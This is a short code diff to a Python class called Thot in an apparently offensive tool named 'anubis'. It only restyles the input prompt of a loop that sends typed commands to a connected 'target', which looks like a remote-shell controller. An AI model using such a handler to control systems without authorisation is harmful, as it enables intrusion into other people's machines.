@@ -397,11 +397,15 @@ class Thot:
 
         try:
             while True:
-                self.__command = input()
+                self.__command = input(
+                    color.color("underline", color.color("lgray", "%s" % "anubis")) + " " + color.color('lgray',
+                                                                                                           '>') + " ").strip()
                 if self.__command == "exit":
                     _exit_flag = True
                     self.__connection_get_target.send(str.encode('\n'))
+                    print("\n")
                     break
+
                 _exit_flag = False
                 self.__connection_get_target.send(str.encode(self.__command + "\n"))
         except:
